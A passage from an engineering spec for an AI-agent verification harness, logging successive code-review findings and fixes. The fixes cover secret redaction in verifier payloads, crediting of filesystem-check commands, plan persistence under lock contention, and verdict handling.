| P3 | Persisted DB parts for P2 | 3 steps, **2 real tool calls** (`bash ls -la`, `read`), `step-finish reason:"tool-calls"` ×2 |
| P4 | `pwd && ls -1` via the verifier | `/tmp/verifierprobe/wt` — **cwd correct** |

Conclusions: `maxSteps: None` does not cap the verifier (it ran 3 steps); tools, permissions and cwd are all correct; **the defect is the payload/prompt path** — P1 and P2 differ only in prompt specificity and produced opposite verdicts on identical bytes. FR-008 downgraded to cleanup; **FR-011** is the root-cause fix, with FR-014 as the deterministic floor.


---

## Round-3 corrections (post-implementation code review, 2026-08-03)

Findings from the second `/grill-code` pass, each reproduced before being
fixed. Recorded here because several contradict what an earlier round of this
spec asserted.

| # | Finding | Status |
|---|---------|--------|
| C1 | A secret split across two payload units leaked a usable fragment at 800 of 3425 probed split points: the tail tripped alone and was dropped, the head was under every standalone threshold and survived. The adjacent-pair check was skipped whenever either unit had already tripped. | Fixed. 0 leaks over 5800 two-way splits (base64/hex/base64url/48-byte). Three-way splits where no two consecutive pieces reach 32 chars remain out of scope — measured at 135/1005 and documented at `scanUnits`. |
| C2 | `boundUnappliedVerdicts` wrote `pass: true` for verdicts the harness refused to act on, so an unverified story satisfied the close-out's `allPassed`. | Fixed — `verifier.unapplied` carries the refusal; `pass` reports what the verifier said. |
| C3 | An aborted plan write is retained in memory, which is correct after a transient collision but silently lost when a peer merge follows — the measured 7-12% stamp loss. | Fixed — pending changes are flushed by any later mutation, a destructive merge logs `plan:unpersisted-change-lost`, and `consumeWriteAbort` lets the checkpoint tool report `persisted: false`. |
| C4 | `test -d research` parsed to `targets: []`, so an observed `test -d src` minted a receipt for `research`. | Fixed — filesystem-predicate runners treat every non-flag operand as a path. |
| M1/M2 | The MAJ-001 inversion was not fixed, only moved: 9 of 10 content phrasings still false-dropped. Plus three further defects found while measuring (coordinated subjects, absence claims with no path, the bare `research/` shape no regex matched). | Fixed — 0 false drops and 0 missed fabrications on the 49-note corpus. |
| M3 | The FR-007 cap stopped the revert but not the loop: it never stamped, so the selector re-ran a full verifier subturn every idle. | Fixed — capped verdicts take a `"capped"` bounding stamp and are reported as DISPUTED, not unverified. |
| M4 | The CRIT-002 backstop was inert — `chat.message` returned above the `resetTurnState` that releases the guard. | Fixed — the guard distinguishes our own echo from user intent. |
| M5/M6/M7 | FR-013's individual crediting only ran in the no-changed-paths branch; the FR-034 compliance join omitted `workspaceRoot`; `.trim()` on an LLM-authored verifier could throw into a hook. | Fixed. |
| M8 | `archiveV1IfPresent` threw into the host on lock contention. | Fixed — deferred to the next call. |
| M9 | `readPlanFile` dropped entries it could not validate and `persistPlan` wrote the file back without them, deleting a peer's plan silently. | Fixed narrowly — only entries with a HIGHER `schemaVersion` are preserved; junk at the current version still degrades gracefully, as its existing test requires. |
| M10/M11 | An aborted `clearPlan`/`createPlan` reported success. | Covered by C3's `consumeWriteAbort` surface. |
| M12 | "The corpus itself is intact" asserted `toBeGreaterThan(0)`, which passes for a 48/1 corpus. | Fixed — pinned to the real 36/13 split. |

### Two spec assertions that were wrong

1. **SC-001a's 42/7 split.** The fixture is 36 `keep` / 13 `drop`. Corrected above.
2. **"An aborted write is not lost work — the next mutation re-reads and re-persists it."** True only while no peer writes in between, and a peer writing is precisely why the lock was contended. See C3.

### Two contracts deliberately NOT changed

Both were reconsidered during this round and kept, because an existing test
encodes them as intentional:

- `mutate` keeps an aborted write's change in memory rather than rolling it
  back. Rolling back would discard the change in the common recoverable case.
- Schema-invalid entries at the current version are still discarded. Only a
  future `schemaVersion` is preserved.


---

## Round-4 corrections (second re-review, 2026-08-03)

The round-3 re-review returned BLOCK. Every finding below was reproduced
before being fixed.

| # | Finding | Resolution |
|---|---------|------------|
| CRIT-1 | C4 was MOVED, not closed. `FILESYSTEM_PREDICATE_RUNNERS` omitted `[[`, so the original false receipt survived verbatim (`[[ -d research ]]` credited by `[[ -d src ]]`). Worse, `test -n research` — a string test that touches no filesystem and always exits 0 — credited `test -d research`. Four of the six set members (`ls`, `stat`, `readlink`, `realpath`) were inert: the runner-word loop eats their bare operand before the new code runs. And `test -d "research"` no longer matched its own unquoted spelling. | Set narrowed to what actually works, `[[` added, a FILE-TEST-operator requirement added, and quotes stripped from targets. 8/8 probe cases correct. |
| CRIT-2 | M1 was MOVED. `ABSENCE_TAIL` was a PREFIX test; the "nothing else in the clause" guarantee rested on `TRAILING_QUALIFIER`, a closed verb list requiring whitespace after the verb. `,` `:` `!` `?` all walked past it, and `absent` / `no such file` were not in the list — so "src/pages/Renewable.jsx is absent the recharts import", a paraphrase of a CORRECT verifier failure, was dropped. | `ABSENCE_TAIL` is end-anchored, and every clause must now account for itself (absence claim, coordinated path, or consequence). 0/8 escapes. |
| MAJ-1 | M10/M11 were reported closed but never wired: `consumeWriteAbort` had one call site. | `plan_create` and `plan_clear` now surface `persisted: false`. |
| MAJ-2 | New, from C3: `writeAborted` is session-keyed, so an aborted reopen made the NEXT (successful) checkpoint report a lost write. | Cleared at the start of each mutation. |
| MAJ-3 | C2's close-out guard had no test — reverting it left the suite green. | Tested via the reachable production path (FR-014 batch sweep + a later clean re-audit); the mutant now dies. |
| MAJ-4 | The escalation flag was set before dispatch (a refused dispatch burned it) and never reset (a second unaudited plan ended in silence). | Spent only on a dispatch that happened; reset in `resetTurnState`. |
| MAJ-5 | **C1's fix introduced an unbounded cascade.** The >=12-char/2-class bar matched `Authorization`, `createPlanRequest`, `snake_case_var_1`; each dropped line implicated its neighbour, so a 40-char git SHA — a documented false positive, no real secret — emptied a whole field, re-creating FR-006a. The repo's own guard test was vacuous (a trailing space made the predicate unreachable). | Bar is now structural (`looksLikeWord` + a pure-hex rule), and the action is to strip the offending TOKEN, not drop the unit — so a cascade is structurally impossible. 0 leaks / 10840 split probes; all innocent lines survive. |
| MAJ-6 | M8 fixed the lock acquisition but not the archive BODY (`mkdirSync`/`renameSync`), still throwing into four synchronous tool handlers. | Whole body wrapped; logs `story:v1-archive-failed`. |
| MAJ-7 | M5 residual: `resolve.ts` tier 1 still `&&`-joins, so a multi-verifier story's verify-gap could never be marked complied. | The compliance join credits any part of an `&&` chain. Receipts still require full coverage. |
| MAJ-8 | M7 patched two call sites but not the root: `createPlan` never type-checked `verifiers` elements. | Validated at the boundary, like `dependsOn`. |
| MAJ-9 | M4 matched the echo by `text.includes(...)`; a host that normalises the prompt would release the guard, and the log said "real user message" either way. | One-shot consume (v1's behaviour); text is now corroborating, not the test. |
| Minors | `foreignEntries` survived an early return and resurrected a deleted plan; M9 excluded the own-session case that the audit actually observed; FR-003's doc contradicted C3; `findings.ts` rendered rejected verdicts as directives; two test-project type errors. | All fixed. |
| Out of scope | `PinStore.gc()` takes the lock unguarded and is called from `chat.message` every activated turn — the same fail-open violation as M8, on a hotter path. | Fixed, since the class was in scope even though the line was not. |

### Residual, stated rather than closed

- **Three-way secret splits** where no two consecutive pieces reach 32 chars still leak (unchanged from round 3).
- **`looksLikeSecretFragment` keeps word-shaped fragments by design.** A key whose split leaves "xQabcdefghijklmn" survives as a fragment. Random key material does not contain long alphabetic runs; verifier evidence is made of nothing else, and deleting evidence is the failure that has actually occurred in production.
- **`grep`/`wc`-style runners** still lose bare-word operands (`grep -q foo Makefile` is credited by `grep -q bar Dockerfile`). Pre-existing and unchanged by C4; fixing it needs per-runner argument grammar, since the operand could be the pattern rather than the path.
- **The 49-note corpus does not exercise the M1 machinery at all** — measured: all 36 `keep` notes are decided by the two cheap pre-filters. A test now pins that fact so the coverage claim cannot be overread again.


---

## Round-5 corrections (third re-review, 2026-08-04)

Verdict was BLOCK again, with three CRITICALs. **One was a regression this
project introduced in round 4** by acting on a round-3 finding without
checking it: the review said `ls`/`stat`/`readlink`/`realpath` were dead code
in the predicate-runner set, and they were removed. They are not dead — the
runner-word loop only swallows the operand of a BARE `ls research`, so every
flagged invocation reached the target filter and started crediting unrelated
directories.

| # | Finding | Resolution |
|---|---------|------------|
| CRIT-1 | Removing the four path runners re-opened C4 in its flagged spelling: `ls -la research` credited by `ls -la src`, and by bare `ls -la`. | Restored, with the two rules separated (`test`/`[`/`[[` need a file-test operator; `ls`/`stat`/… do not). 9 regression cases pinned. |
| CRIT-2 | The file-test-operator requirement gated only BARE operands, so `test -n package.json` and bare `test package.json` — neither of which touches the filesystem — credited `test -f package.json`. | The operator is now part of the runner identity: `test -f` and `test -n` are different runners, and a bare `test` covers neither. |
| CRIT-3 | `stripFacingFragment` examined the whole `\S+` edge token, so any adjacent punctuation sheltered the fragment — the leaking shapes (`( [ " ' \` ; ) ,`) are JSON, markdown and quoted shell output, all of which reach the verifier payload. | It now locates the maximal secret-alphabet RUN at the edge, skipping punctuation and newlines but never spaces. 0 leaks over 12400 bare + 224 punctuation-adjacent splits. |
| MAJ-1/2 | 16 of 22 round-4 fixes had no test that died when reverted, and the new cascade tests were vacuous — their adjacent line led with `Authorization` (13 chars, under the 16-char floor), so the predicate never ran. | A 20-mutant battery now runs clean. Two survivors were investigated and found to be redundant code, not missing tests; both are documented as such in place. |
| MAJ-3 | The `gc` fix guarded the lock acquisition but not the body — the identical half-fix MAJ-6 had called out in `story.ts`. | Body wrapped. Tested through the injectable `fsIO` seam, because a chmod-based test silently passes for root. |
| MAJ-4 | The `&&` compliance credit applied to every prescription, including mixed-ecosystem joins whose whole point is that neither half covers the other — and marking the family complied suppresses verify-gap for the rest of the session. | Scoped to tier-1 story verifiers, and extracted as `verifyGapComplied` so it is testable at all; being inline in a hook is why it went unguarded. |

### Two defects found by tests written for something else

- **The FR-006a false positive was still live in the general case.** Two clean
  prose lines — "…assigned correctly" + "tests/fixtures/verifier-replay was
  refreshed" — fuse into a 32+ char token over the entropy bar, and BOTH were
  dropped. The round-3 exoneration only covered a left fragment ending in a
  file extension. `looksLikeWord` now decides it, applied to both fragments
  (applied to the whole token it re-opened 20 leaks: a 43-char base64 key can
  itself segment into enough pseudo-words to pass).
- **`looksLikeWord` was too weak for base64.** `Txob|Y+f|Dakt|WCr|SX|Rdw`
  scored 4 wordy segments of 8 and passed. Two further guards: `+`/`=` never
  occur in prose, and real words are longer (mean alphabetic-segment length
  >= 4.5; `tests|fixtures|verifier|replay` averages 6, base64 pseudo-words 3-4).

### Dead code removed rather than kept

The round-4 change that let M9 preserve an own-session future-schema entry was
decoration: `persistPlan` either overwrites `file[sessionID]` from the cached
plan, or — with no cached plan, i.e. an explicit clear — drops it deliberately.
A surviving mutant proved there is no path on which it matters. Reverted.


---

## Round-6: workflow code review (58 agents, xhigh), 2026-08-04

Reviewed tip `bd731c3`, one commit behind the round-5 fixes. 15 CONFIRMED
findings; 3 were already closed by round 5, 12 were live.

| # | Finding | Outcome |
|---|---------|---------|
| CR-2 | `dewrap` strips `\n` only, so a surviving `\r` separates tokens and defeats the ENTIRE wrapped-secret machinery — per-unit scan, pair join and fragment strip all miss. Reproduced: a 40-char hex key wrapped across two CRLF lines transmitted whole where the identical LF input fully redacted. | Fixed — strips `[\r\n]`. 0 leaks over 2520 CRLF splits. |
| CR-4 | An empty `items` array made the FR-014 trigger vacuously false, so the least substantiated verdict possible (`pass:false`, no items, zero tool calls) bypassed the floor and reverted the story. | Fixed — the trigger is now "would this verdict cost anything". |
| CR-5 | The floor was story-blind: it stamped every story in the batch `unverified`, including ones the verifier PASSED with all items met, barring them from `allPassed` AND re-audit forever. | Fixed — only unsubstantiated verdicts are bounded; a clean pass in the same batch is applied. |
| CR-8 | `applyPathVeto` matched the contradiction set by `itemId`, which is LLM-authored and not unique — a duplicate id let one disproven path claim clear a genuine content failure. | Fixed — matched by object identity. |
| CR-10 | `test ! -f x` succeeds precisely when the file is ABSENT and was crediting a prescribed `test -f x`. `!` is absorbed by the runner-word loop, so it had to be looked for on both sides. | Fixed. |
| CR-6 | The join exoneration was a hard-coded 20-extension allowlist, so the production false positive recurred for `.sql`, `.proto`, `.tf`, … | Fixed — any dotted filename, with `looksLikeWord` as the general backstop. |
| CR-7 | `stripQuoted` treated every apostrophe as a quote delimiter, deleting the span between two contractions; and `doesn't exist` was classified as a POSITIVE existence assertion because the lookbehinds matched only `not ` / `no `. | Fixed both; real single-quoted spans still read as commands. |
| CR-11 | `resetTurnState` runs only on the activation branch, so an already-active session never reset `unauditedEscalated` (second unaudited plan → silence) or `storyReaudits` (accumulated across plans → cap tripped early). | Fixed at the message boundary. |
| CR-13 | `reconcileWithDisk` re-raised `writeAborted`, so the checkpoint tool reported the CURRENT, successfully persisted write as unwritten. | Fixed — the loss is logged, not re-attributed. |
| CR-14 | `readObservedToolCall` added an unbounded `session.messages` await on the `session.idle` path. | Fixed — 5s cap degrading to the existing fail-open `undefined`. |
| CR-15 | `maxStoryReaudits: 0`, the documented way to disable the FR-007 cap, was unreachable because `0` is falsy in the `||` chain. | Fixed — coalesce on definedness. |
| CR-1, CR-3 | Punctuation-adjacent fragments; base64 fragments read as word-shaped. | Already closed by round 5 (verified on the current tree). |

### Two findings answered rather than "fixed"

- **CR-9 (one-of-N verifier crediting mints a full receipt).** Not a defect —
  it follows from a deliberate separation the harness is built on, which this
  spec had failed to state:

  > **Acceptance criteria are met by JUDGEMENT. Technical checks are
  > evidence, and may be looser.**

  A story's `verifiers` are technical checks. A receipt asserts exactly one
  thing — "this command ran and exited 0" — which is true whether or not the
  story's other verifiers also ran. It cannot approve a story: acceptance
  items carry no receipt requirement (`AcceptanceItem.evidence` is deprecated
  and read by nothing), and `story.ts` names the completion verifier the "sole
  arbiter of whether a checkpoint's claim was real". Verifier output reaches
  the verifier as `verifierSummaries` — input to its verifierment, never a
  substitute for it.

  Demanding that one observed command cover ALL of a story's verifiers applied
  acceptance-criteria strictness to a technical check, and the measured cost
  was total: 146 relevance-gaps and 0 receipts in the audited session, which
  is also why the receipt-based cross-check had no data to work with.
- **CR-12 (no health alert on continuation timeout).** The informational-only
  timeout is a deliberate earlier fix: the harness was raising outages for its
  own successful continuations, masking real ones. The wedge half of the
  finding is closed by the M4 guard release, which runs for every
  `chat.message` regardless of activation.

### A defect the base64url probe found

`looksLikeWord` still passed base64url fragments, which segment on their own
`-`/`_` into runs like `Nvrf`, `fdgb`, `KBCdfv`. Added the obvious missing
constraint: **a word has a vowel**. That closed the last 5 leaks in a
12000-split sweep and keeps every prose token the earlier bars protected.
